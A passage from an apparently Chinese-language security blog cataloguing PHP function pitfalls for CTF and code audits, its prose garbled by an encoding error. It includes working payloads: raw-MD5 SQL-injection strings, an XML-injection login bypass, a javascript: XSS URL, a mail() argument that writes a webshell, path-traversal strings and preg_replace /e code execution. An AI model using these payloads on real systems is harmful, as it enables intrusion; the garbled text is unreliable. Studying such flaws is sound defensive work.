&quot;vï¿½anï¿½ï¿½ï¿½lï¿½ï¿½ï¿½qï¿½ï¿½\&quot;</span><br><span class="line"></span><br><span class="line">//å¯ä»¥çœ‹åˆ°å­—ç¬¦ä¸²ffifdyopè¢«md5åä¼šäº§ç”Ÿ&apos;or&apos;ï¼Œä»è€Œå¯ä»¥äº§ç”Ÿä¸‡èƒ½å¯†ç è¿›è¡Œç™»å½•</span><br><span class="line">php &gt; echo md5(&quot;ffifdyop&quot;,true);</span><br><span class="line">&apos;or&apos;6ï¿½]ï¿½ï¿½!r,ï¿½ï¿½b</span><br><span class="line"></span><br><span class="line">php &gt; echo md5(&quot;129581926211651571912466741651878684928&quot;,true);</span><br><span class="line">ï¿½T0Dï¿½ï¿½o#ï¿½ï¿½&apos;or&apos;8</span><br><span class="line"></span><br><span class="line">content: 129581926211651571912466741651878684928</span><br><span class="line">count:   18933549</span><br><span class="line">hex:     06da5430449f8f6f23dfc1276f722738</span><br><span class="line">raw:     ?T0D??o#??&apos;or&apos;8.N=?</span><br></pre></td></tr></table></figure><p>å‚è€ƒ: <a href="http://cvk.posthaven.com/sql-injection-with-raw-md5-hashes" target="_blank" rel="noopener">SQL injection with raw MD5 hashes</a></p><h4 id="4-strcmp"><a href="#4-strcmp" class="headerlink" title="4.strcmp"></a>4.strcmp</h4><p>æ³¨ï¼š5.3ä¹‹å‰ç‰ˆæœ¬çš„phpå­˜åœ¨å¦‚ä¸‹é—®é¢˜</p><p>å½“è¿™ä¸ªå‡½æ•°æ¥å—åˆ°äº†ä¸ç¬¦åˆçš„ç±»å‹ï¼Œè¿™ä¸ªå‡½æ•°å°†å‘ç”Ÿé”™è¯¯å¹¶è¿”å›0ï¼Œå› è€Œå¯ä»¥ä½¿ç”¨æ•°ç»„ç»•è¿‡éªŒè¯</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$flag = &quot;flag&#123;xxxxx&#125;&quot;;</span><br><span class="line">if (isset($_GET[&apos;a&apos;])) &#123;</span><br><span class="line">if (strcmp($_GET[&apos;a&apos;], $flag) == 0) //å¦‚æœ str1 å°äº str2 è¿”å› &lt; 0ï¼› å¦‚æœ str1å¤§äº str2è¿”å› &gt; 0ï¼›å¦‚æœä¸¤è€…ç›¸ç­‰ï¼Œè¿”å› 0ã€‚</span><br><span class="line">//æ¯”è¾ƒä¸¤ä¸ªå­—ç¬¦ä¸²ï¼ˆåŒºåˆ†å¤§å°å†™ï¼‰</span><br><span class="line">die(&apos;Flag: &apos;.$flag);</span><br><span class="line">else</span><br><span class="line">print &apos;No&apos;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h4 id="5-ereg"><a href="#5-ereg" class="headerlink" title="5.ereg"></a>5.ereg</h4><p>ereg()å‡½æ•°åªèƒ½å¤„ç†å­—ç¬¦ï¼Œå¦‚æœä¼ å…¥æ•°ç»„å°†è¿”å›null</p><h4 id="6-strpos"><a href="#6-strpos" class="headerlink" title="6.strpos"></a>6.strpos</h4><p>strpos()çš„å‚æ•°ä¸èƒ½å¤Ÿæ˜¯æ•°ç»„ï¼Œæ‰€ä»¥å¤„ç†æ•°ç»„è¿”å›çš„æ˜¯null</p><p>strpos()ä¸PHPçš„è‡ªåŠ¨ç±»å‹è½¬æ¢ç»“åˆä¹Ÿä¼šå‡ºåœ¨å“ªé—®é¢˜</p><p>å¦‚ä¸‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var_dump(strpos(&apos;abcd&apos;,&apos;a&apos;));       # 0</span><br><span class="line">var_dump(strpos(&apos;abcd&apos;,&apos;x&apos;));       # false</span><br></pre></td></tr></table></figure><p>å¹¶ä¸”ç”±äºPHPçš„è‡ªåŠ¨ç±»å‹è½¬æ¢çš„å…³ç³»ï¼Œ0å’Œfalseæ˜¯ç›¸ç­‰çš„</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var_dump(0==false);         # true</span><br></pre></td></tr></table></figure><p>ä¾‹é¢˜ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">class Login &#123;</span><br><span class="line">    public function __construct($user, $pass) &#123;</span><br><span class="line">        $this-&gt;loginViaXml($user, $pass);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function loginViaXml($user, $pass) &#123;</span><br><span class="line">        if (</span><br><span class="line">            (!strpos($user, &apos;&lt;&apos;) || !strpos($user, &apos;&gt;&apos;)) &amp;&amp;</span><br><span class="line">            (!strpos($pass, &apos;&lt;&apos;) || !strpos($pass, &apos;&gt;&apos;))</span><br><span class="line">        ) &#123;</span><br><span class="line">            $format = &apos;&lt;xml&gt;&lt;user=&quot;%s&quot;/&gt;&lt;pass=&quot;%s&quot;/&gt;&lt;/xml&gt;&apos;;</span><br><span class="line">            $xml = sprintf($format, $user, $pass);</span><br><span class="line">            $xmlElement = new SimpleXMLElement($xml);</span><br><span class="line">            // Perform the actual login.</span><br><span class="line">            $this-&gt;login($xmlElement);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">new Login($_POST[&apos;username&apos;], $_POST[&apos;password&apos;]);</span><br></pre></td></tr></table></figure><p>ä¼ å…¥çš„usernameå’Œpasswordçš„é¦–ä½å­—ç¬¦æ˜¯&lt;æˆ–è€…æ˜¯&gt;å°±å¯ä»¥ç»•è¿‡é™åˆ¶ï¼Œé‚£ä¹ˆæœ€åçš„pyaloadå°±æ˜¯ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=&lt;&quot;&gt;&lt;injected-tag%20property=&quot;&amp;password=&lt;&quot;&gt;&lt;injected-tag%20property=&quot;</span><br></pre></td></tr></table></figure><p>æœ€ç»ˆä¼ å…¥åˆ°$this-&gt;login($xmlElement)çš„$xmlElementå€¼æ˜¯<code>&lt;xml&gt;&lt;user=&quot;&lt;&quot;&gt;&lt;injected-tag property=&quot;&quot;/&gt;&lt;pass=&quot;&lt;&quot;&gt;&lt;injected-tag property=&quot;&quot;/&gt;&lt;/xml&gt;</code>è¿™æ ·å°±å¯ä»¥è¿›è¡Œæ³¨å…¥äº†ã€‚</p><h4 id="7-is-numeric"><a href="#7-is-numeric" class="headerlink" title="7.is_numeric"></a>7.is_numeric</h4><p>is_numeric()å‡½æ•°å¯¹äºç©ºå­—ç¬¦%00ï¼Œæ— è®ºæ˜¯%00æ”¾åœ¨å‰åéƒ½å¯ä»¥åˆ¤æ–­ä¸ºéæ•°å€¼ï¼Œè€Œ%20ç©ºæ ¼å­—ç¬¦åªèƒ½æ”¾åœ¨æ•°å€¼åã€‚</p><p>æ­¤å¤–ï¼Œis_numeric()å‡½æ•°åœ¨åˆ¤æ–­æ˜¯å¦æ˜¯æ•°å­—æ—¶ä¼šå¿½ç•¥å­—ç¬¦ä¸²å¼€å¤´çš„â€™ â€˜ã€â€™\tâ€™ã€â€™\nâ€™ã€â€™\râ€™ã€â€™\vâ€™ã€â€™\fâ€™ã€‚è€Œâ€™.â€™å¯ä»¥å‡ºç°åœ¨ä»»æ„ä½ç½®ï¼ŒEã€eèƒ½å‡ºç°åœ¨å‚æ•°ä¸­é—´ï¼Œä»å¯ä»¥è¢«åˆ¤æ–­ä¸ºæ•°å­—ã€‚ä¹Ÿå°±æ˜¯è¯´is_numeric(â€œ\r\n\t 0.1e2â€) &gt;&gt; TRUE</p><h4 id="8-ord"><a href="#8-ord" class="headerlink" title="8.ord"></a>8.ord</h4><p>ord()å‡½æ•°è¿”å›å­—ç¬¦ä¸²çš„é¦–ä¸ªå­—ç¬¦çš„ ASCII å€¼</p><p>ä¾‹å¦‚ä¸‹é¢è¿™é“é¢˜ç›®ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨16è¿›åˆ¶ç»•è¿‡é™åˆ¶</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">function noother_says_correct($temp)</span><br><span class="line">&#123;</span><br><span class="line">$flag = &apos;flag&#123;test&#125;&apos;;</span><br><span class="line">$one = ord(&apos;1&apos;); //ord â€” è¿”å›å­—ç¬¦çš„ ASCII ç å€¼</span><br><span class="line">$nine = ord(&apos;9&apos;); //ord â€” è¿”å›å­—ç¬¦çš„ ASCII ç å€¼</span><br><span class="line">$number = &apos;3735929054&apos;;</span><br><span class="line">// Check all the input characters!</span><br><span class="line">for ($i = 0; $i &lt; strlen($number); $i++)</span><br><span class="line">&#123;</span><br><span class="line">// Disallow all the digits!</span><br><span class="line">$digit = ord($temp&#123;$i&#125;);</span><br><span class="line">if ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) )</span><br><span class="line">&#123;</span><br><span class="line">// Aha, digit not allowed!</span><br><span class="line">return &quot;flase&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">if($number == $temp)</span><br><span class="line">return $flag;</span><br><span class="line">&#125;</span><br><span class="line">$temp = $_GET[&apos;password&apos;];</span><br><span class="line">echo noother_says_correct($temp);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h4 id="9-ç§‘å­¦è®¡æ•°æ³•"><a href="#9-ç§‘å­¦è®¡æ•°æ³•" class="headerlink" title="9.ç§‘å­¦è®¡æ•°æ³•"></a>9.ç§‘å­¦è®¡æ•°æ³•</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">strlen($_GET[&apos;password&apos;]) &lt; 8 &amp;&amp; $_GET[&apos;password&apos;] &gt; 9999999</span><br><span class="line"></span><br><span class="line">payload==&gt;1e9</span><br></pre></td></tr></table></figure><h4 id="10-in-array"><a href="#10-in-array" class="headerlink" title="10.in_array"></a>10.in_array</h4><p>è¯­æ³•ï¼šin_array(search,array,type)</p><table><thead><tr><th>å‚æ•°</th><th>æè¿°</th></tr></thead><tbody><tr><td>search</td><td>å¿…éœ€ã€‚è§„å®šè¦åœ¨æ•°ç»„æœç´¢çš„å€¼ã€‚</td></tr><tr><td>array</td><td>å¿…éœ€ã€‚è§„å®šè¦æœç´¢çš„æ•°ç»„ã€‚</td></tr><tr><td>type</td><td>å¯é€‰ã€‚å¦‚æœè®¾ç½®è¯¥å‚æ•°ä¸º trueï¼Œåˆ™æ£€æŸ¥æœç´¢çš„æ•°æ®ä¸æ•°ç»„çš„å€¼çš„ç±»å‹æ˜¯å¦ç›¸åŒã€‚</td></tr></tbody></table><p>æ³¨æ„ï¼šin_array()çš„ç¬¬ä¸‰ä¸ªå‚æ•°åœ¨é»˜è®¤æƒ…å†µä¸‹æ˜¯falseï¼Œå› æ­¤ PHP ä¼šå°è¯•å°†æ–‡ä»¶åè‡ªåŠ¨è½¬æ¢ä¸ºæ•´æ•°å†è¿›è¡Œåˆ¤æ–­ï¼Œå¯¼è‡´è¯¥åˆ¤æ–­å¯è¢«ç»•è¿‡ã€‚</p><p>ä¾‹å¦‚å¦‚ä¸‹ä»£ç åœ¨13 è¡Œå­˜åœ¨ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´ã€‚ åœ¨ 12 è¡Œä»£ç é€šè¿‡ <code>in_array()</code> æ¥åˆ¤æ–­æ–‡ä»¶åæ˜¯å¦ä¸ºæ•´æ•°ï¼Œå¯æ˜¯æœªå°† <code>in_array()</code> çš„ç¬¬ä¸‰ä¸ªå‚æ•°è®¾ç½®ä¸º true ã€‚<code>in_array()</code>çš„ç¬¬ä¸‰ä¸ªå‚æ•°åœ¨é»˜è®¤æƒ…å†µä¸‹æ˜¯falseï¼Œå› æ­¤ PHP ä¼šå°è¯•å°†æ–‡ä»¶åè‡ªåŠ¨è½¬æ¢ä¸ºæ•´æ•°å†è¿›è¡Œåˆ¤æ–­ï¼Œå¯¼è‡´è¯¥åˆ¤æ–­å¯è¢«ç»•è¿‡ã€‚æ¯”å¦‚ä½¿ç”¨æ–‡ä»¶åä¸º 5vulnspy.php çš„æ–‡ä»¶å°†å¯ä»¥æˆåŠŸé€šè¿‡ <code>in_array($this-&gt;file[&#39;name&#39;], $this-&gt;whitelist)</code> åˆ¤æ–­ï¼Œä»è€Œå°†æ¶æ„çš„ PHP æ–‡ä»¶ä¸Šä¼ åˆ°æœåŠ¡å™¨ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">class Challenge &#123;</span><br><span class="line">    const UPLOAD_DIRECTORY = &apos;./solutions/&apos;;</span><br><span class="line">    private $file;</span><br><span class="line">    private $whitelist;</span><br><span class="line"></span><br><span class="line">    public function __construct($file) &#123;</span><br><span class="line">        $this-&gt;file = $file;</span><br><span class="line">        $this-&gt;whitelist = range(1, 24);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __destruct() &#123;</span><br><span class="line">        if (in_array($this-&gt;file[&apos;name&apos;], $this-&gt;whitelist)) &#123;</span><br><span class="line">            move_uploaded_file(</span><br><span class="line">                $this-&gt;file[&apos;tmp&apos;],</span><br><span class="line">                self::UPLOAD_DIRECTORY . $this-&gt;file[&apos;name&apos;]</span><br><span class="line">            );</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$challenge = new Challenge($_FILES[&apos;solution&apos;]);</span><br></pre></td></tr></table></figure><p>æµ‹è¯•</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$myarray = range(1,24); </span><br><span class="line">in_array(&apos;5vulnspy.php&apos;,$myarray);         //true</span><br><span class="line">in_array(&apos;5vulnspy.php&apos;,$myarray,true);    //false</span><br></pre></td></tr></table></figure><p>æ³¨:array_search()ä¸in_array()ä¹Ÿæ˜¯ä¸€æ ·çš„é—®é¢˜ã€‚</p><h4 id="11-filter-var"><a href="#11-filter-var" class="headerlink" title="11.filter_var"></a>11.filter_var</h4><p>filter_var()çš„URLè¿‡æ»¤éå¸¸çš„å¼±ï¼Œåªæ˜¯å•çº¯çš„ä»å½¢å¼ä¸Šæ£€æµ‹å¹¶æ²¡æœ‰æ£€æµ‹åè®®ã€‚æµ‹è¯•å¦‚ä¸‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var_dump(filter_var(&apos;vulnspy.com&apos;, FILTER_VALIDATE_URL));           # false</span><br><span class="line">var_dump(filter_var(&apos;http://vulnspy.com&apos;, FILTER_VALIDATE_URL));    # http://vulnspy.com</span><br><span class="line">var_dump(filter_var(&apos;xxxx://vulnspy.com&apos;, FILTER_VALIDATE_URL));    # xxxx://vulnspy.com</span><br><span class="line">var_dump(filter_var(&apos;http://vulnspy.com&gt;&apos;, FILTER_VALIDATE_URL));   # false</span><br></pre></td></tr></table></figure><p>è¿™ç§æƒ…å†µä¸‹å¯ä»¥é‡‡ç”¨å¦‚ä¸‹payload<code>javascript://comment%250aalert(1)</code>æ¥è§¦å‘XSS</p><p>æ³¨ï¼š%250aå³%0aè¡¨ç¤ºæ¢è¡Œç¬¦ï¼Œä¸Šé¢çš„payloadä¼šè¢«æ¢è¡Œï¼Œå¹¶ä¸”//è¡¨ç¤ºæ³¨é‡Šã€‚æœ€ç»ˆè§¦å‘åå°†å¾—åˆ°å¦‚ä¸‹å½¢å¼</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">javascript://comment</span><br><span class="line">alert(1)</span><br></pre></td></tr></table></figure><h4 id="12-class-exist"><a href="#12-class-exist" class="headerlink" title="12.class_exist"></a>12.class_exist</h4><p>ä»¥class_exist()ä¸ºä¾‹çš„ä¸‹åˆ—å‡½æ•°ä¼šåœ¨åœ¨PHP 5.4ä»¥ä¸‹ç‰ˆæœ¬ä¸­å­˜åœ¨ä»»æ„æ–‡ä»¶åŒ…å«æ¼æ´</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">call_user_func()</span><br><span class="line">call_user_func_array()</span><br><span class="line">class_exists()</span><br><span class="line">class_implements()</span><br><span class="line">class_parents()</span><br><span class="line">class_uses()</span><br><span class="line">get_class_methods()</span><br><span class="line">get_class_vars()</span><br><span class="line">get_parent_class()</span><br><span class="line">interface_exists()</span><br><span class="line">is_a()</span><br><span class="line">is_callable()</span><br><span class="line">is_subclass_of()</span><br><span class="line">method_exists()</span><br><span class="line">property_exists()</span><br><span class="line">spl_autoload_call()</span><br><span class="line">trait_exists()</span><br></pre></td></tr></table></figure><p>æ³¨ï¼šclass_exists()ä¼šæ£€æŸ¥æ˜¯å¦å­˜åœ¨å¯¹åº”çš„ç±»ï¼Œå½“è°ƒç”¨class_exists()å‡½æ•°æ—¶ä¼šè§¦å‘ç”¨æˆ·å®šä¹‰çš„<strong>autoload()å‡½æ•°ï¼Œç”¨äºåŠ è½½æ‰¾ä¸åˆ°çš„ç±»(è¿™ä¸ªç‰¹æ€§æ˜¯å› ä¸ºclass_existså‡½æ•°ä¸­çš„$autoloadå‚æ•°ï¼Œé»˜è®¤æ˜¯trueé€ æˆçš„)ã€‚æ‰€ä»¥å¦‚æœæˆ‘ä»¬è¾“å…¥../../../../etc/passwdæ˜¯ï¼Œå°±ä¼šè°ƒç”¨class_exists()ï¼Œè¿™æ ·å°±ä¼šè§¦å‘</strong>autoload(),è¿™æ ·å°±æ˜¯ä¸€ä¸ªä»»æ„æ–‡ä»¶åŒ…å«çš„æ¼æ´äº†ã€‚</p><p>æ³¨: PHP5~5.3(åŒ…å«5.3ç‰ˆæœ¬)ç‰ˆæœ¬ ä¹‹é—´æ‰å¯ä»¥ä½¿ç”¨è·¯å¾„ç©¿è¶Šç¬¦å·â€../â€œã€‚</p><p>æ­¤å¤–ï¼Œè¿˜å­˜åœ¨ä¸€ä¸ªblind xxeçš„æ¼æ´ï¼Œç”±äºå­˜åœ¨class_exists()ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥è°ƒç”¨PHPçš„å†…ç½®å‡½æ•°,å¹¶ä¸”é€šè¿‡$controller = new $controllerName($data);è¿›è¡Œå®ä¾‹åŒ–ã€‚å€ŸåŠ©ä¸PHPä¸­çš„SimpleXMLElementç±»æ¥å®ŒæˆXXEæ”»å‡»ã€‚</p><p>xxeæ¼æ´å®ä¾‹å‚è€ƒï¼š</p><p><a href="https://blog.ripstech.com/2017/shopware-php-object-instantiation-to-blind-xxe/" target="_blank" rel="noopener">shopware blind xxe</a></p><p><a href="http://bobao.360.cn/learning/detail/3082.html" target="_blank" rel="noopener">æˆ‘æ˜¯å¦‚ä½•é»‘æ‰â€œPornhubâ€æ¥å¯»æ±‚ä¹è¶£å’Œèµ¢å¾—10000$çš„å¥–é‡‘</a></p><p>å‚è€ƒï¼š<br><a href="https://stackoverflow.com/questions/3812851/there-is-a-way-to-use-class-exists-and-autoload-without-crash-the-script" target="_blank" rel="noopener">stackoverflow:class_exists&amp;autoloadï¼š</a></p><h4 id="13-mail"><a href="#13-mail" class="headerlink" title="13.mail"></a>13.mail</h4><p>mail()ä¸­çš„ç¬¬äº”ä¸ªå‚æ•°å¯ä»¥-Xçš„æ–¹å¼å†™å…¥webshellã€‚</p><p>payloadï¼š<a href="mailto:`example@example.com" target="_blank" rel="noopener">`example@example.com</a> -OQueueDirectory=/tmp -X/var/www/html/rce.php`</p><p>è¿™ä¸ªPoCçš„åŠŸèƒ½æ˜¯åœ¨Webç›®å½•ä¸­ç”Ÿæˆä¸€ä¸ªPHP webshellã€‚è¯¥æ–‡ä»¶ï¼ˆrce.phpï¼‰åŒ…å«å—åˆ°PHPä»£ç æ±¡æŸ“çš„æ—¥å¿—ä¿¡æ¯</p><p>escapeshellarg()å’Œfilter_var()ä¸å®‰å…¨çš„é—®é¢˜å‚è€ƒ<a href="https://www.anquanke.com/post/id/86015" target="_blank" rel="noopener">åœ¨PHPåº”ç”¨ç¨‹åºå¼€å‘ä¸­ä¸æ­£å½“ä½¿ç”¨mail()å‡½æ•°å¼•å‘çš„è¡€æ¡ˆ</a></p><p>escapeshellargå’Œescapeshellcmdè”åˆä½¿ç”¨ä»è€Œé€ æˆçš„å®‰å…¨é—®é¢˜å‚è€ƒ<a href="https://paper.seebug.org/164/#" target="_blank" rel="noopener">PHP escapeshellarg()+escapeshellcmd() ä¹‹æ®‡</a></p><h4 id="14-æ­£åˆ™è¡¨è¾¾å¼å¯èƒ½å­˜åœ¨é—®é¢˜"><a href="#14-æ­£åˆ™è¡¨è¾¾å¼å¯èƒ½å­˜åœ¨é—®é¢˜" class="headerlink" title="14.æ­£åˆ™è¡¨è¾¾å¼å¯èƒ½å­˜åœ¨é—®é¢˜"></a>14.æ­£åˆ™è¡¨è¾¾å¼å¯èƒ½å­˜åœ¨é—®é¢˜</h4><p>(1)<br>å¦‚æœ¬æ„æƒ³å°†éa-zã€.ã€-ã€<em>å…¨éƒ¨æ›¿æ¢ä¸ºç©ºï¼Œä½†æ˜¯æ­£åˆ™è¡¨è¾¾å¼å†™æˆäº†`[^a-z.-</em>]`ï¼Œå…¶ä¸­æ²¡æœ‰å¯¹-è¿›è¡Œè½¬ä¹‰ï¼Œé‚£ä¹ˆ-è¡¨ç¤ºä¸€ä¸ªåˆ—è¡¨ï¼Œä¾‹å¦‚[1-9]è¡¨ç¤ºçš„æ•°å­—1åˆ°9ï¼Œä½†æ˜¯å¦‚æœ[1-9]è¡¨ç¤ºå°±æ˜¯å­—æ¯1ã€-å’Œ9ã€‚æ‰€ä»¥[^a-z.-_]è¡¨ç¤ºçš„å°±æ˜¯éasciiè¡¨ä¸­çš„åºå·ä¸º46è‡³122çš„å­—æ¯æ›¿æ¢ä¸ºç©ºã€‚é‚£ä¹ˆæ­¤æ—¶çš„../â€¦/å°±ä¸ä¼šè¢«åŒ¹é…ï¼Œå°±å¯ä»¥è¿›è¡Œç›®å½•ç©¿è¶Šï¼Œä»è€Œé€ æˆä»»æ„æ–‡ä»¶åˆ é™¤äº†ã€‚</p><p>(2)åœ¨ååºåˆ—åŒ–æ¼æ´ä¸­å¯¹äº<code>preg_match(&#39;/O:\d:/&#39;, $data)</code>è¿™æ ·çš„æ­£åˆ™å¯ä»¥é‡‡ç”¨åœ¨å¯¹è±¡é•¿åº¦å‰æ·»åŠ ä¸€ä¸ª+å·ï¼Œå³o:14-&gt;o:+14æ¥è¿›è¡Œç»•è¿‡ã€‚</p><p>å‚è€ƒï¼š<a href="http://www.phpbug.cn/archives/32.html" target="_blank" rel="noopener">phpååºåˆ—unserializeçš„ä¸€ä¸ªå°ç‰¹æ€§</a></p><h4 id="15-parse-str"><a href="#15-parse-str" class="headerlink" title="15.parse_str"></a>15.parse_str</h4><p>parse_str()å¯ä»¥åœ¨å‚æ•°å¯æ§çš„æƒ…å†µä¸‹å¯ä»¥é€ æˆå˜é‡è¦†ç›–æ¼æ´</p><p>ä¾‹å¦‚ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$var = parse_url($_SERVER[&apos;HTTP_REFERER&apos;]);</span><br><span class="line">parse_str($var[&apos;query&apos;]);</span><br></pre></td></tr></table></figure><h4 id="16-preg-replace"><a href="#16-preg-replace" class="headerlink" title="16.preg_replace"></a>16.preg_replace</h4><p>preg_replace() /e æ¨¡å¼å¯ä»¥æ‰§è¡Œä»»æ„ä»£ç ï¼Œä¾‹å­å¦‚ä¸‹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">header(&quot;Content-Type: text/plain&quot;);</span><br><span class="line"></span><br><span class="line">function complexStrtolower($regex, $value) &#123;</span><br><span class="line">    return preg_replace(</span><br><span class="line">        &apos;/(&apos; . $regex . &apos;)/ei&apos;,</span><br><span class="line">        &apos;strtolower(&quot;\\1&quot;)&apos;,</span><br><span class="line">        $value</span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">foreach ($_GET as $regex =&gt; $value) &#123;</span><br><span class="line">    echo complexStrtolower($regex, $value) . &quot;\n&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>preg_replaceçš„å‚æ•°å«ä¹‰å‚è€ƒ <a href="http://php.net/manual/zh/function.preg-replace.php" target="_blank" rel="noopener">PHPæ‰‹å†Œâ€“preg_replace</a></p><p>åœ¨æ­¤å¤„æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æœ‰ä¸¤å¤„çš„å€¼æ˜¯æˆ‘ä»¬å¯ä»¥æ“æ§çš„ï¼Œä½†æ˜¯åªæœ‰åœ¨â€™strtolower(â€œ\1â€)â€™è¿™ä¸ªä½ç½®çš„å‚æ•°æ‰å¯ä»¥æ‰§è¡Œä»£ç ï¼Œæ‰€ä»¥å…³é”®å°±åœ¨è¿™å„¿ã€‚ \1æ˜¯å…·æœ‰ç‰¹æ®Šå«ä¹‰çš„ï¼Œåœ¨è¿™å„¿å°±æ˜¯å°±æ˜¯æŒ‡å®šç¬¬ä¸€ä¸ªå­åŒ¹é…é¡¹,ä¹Ÿå³${phpinfo()}ï¼Œè¿›è€Œè¾¾åˆ°æ‰§è¡Œä»£ç çš„ç›®çš„</p><p>å‚è€ƒæ–‡ç« ï¼š</p><p><a href="https://xz.aliyun.com/t/2557" target="_blank" rel="noopener">æ·±å…¥ç ”ç©¶preg_replaceä¸ä»£ç æ‰§è¡Œ</a></p><p><a href="http://php.net/manual/zh/regexp.reference.back-references.php" target="_blank" rel="noopener">åå‘å¼•ç”¨</a></p><p><a href="https://www.cdxy.me/?p=756" target="_blank" rel="noopener">ä¸€ä¸ªPHPæ­£åˆ™ç›¸å…³çš„â€œç»å…¸æ¼æ´â€</a></p><h4 id="17-str-replace"><a href="#17-str-replace" class="headerlink" title="17.str_replace"></a>17.str_replace</h4><p>str_replace()å‡½æ•°æ˜¯å•æ¬¡æ›¿æ¢è€Œä¸æ˜¯å¤šæ¬¡æ›¿æ¢ï¼Œå› è€Œå¯ä»¥é€šè¿‡åŒå†™æ•æ„Ÿè¯æ±‡è¿‡æ»¤ï¼Œä¾‹å¦‚ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">str_replace(&apos;../&apos;, &apos;&apos;, $language);</span><br><span class="line">//payload:..././æˆ–è€…....//</span><br></pre></td></tr></table></figure><h4 id="18-header"><a href="#18-header" class="headerlink" title="18.header"></a>18.header</h4><p>ä½¿ç”¨header()è¿›è¡Œè·³è½¬çš„æ—¶å€™æ²¡æœ‰ä½¿ç”¨exit()æˆ–è€…æ˜¯die()ï¼Œå¯¼è‡´åç»­çš„ä»£ç 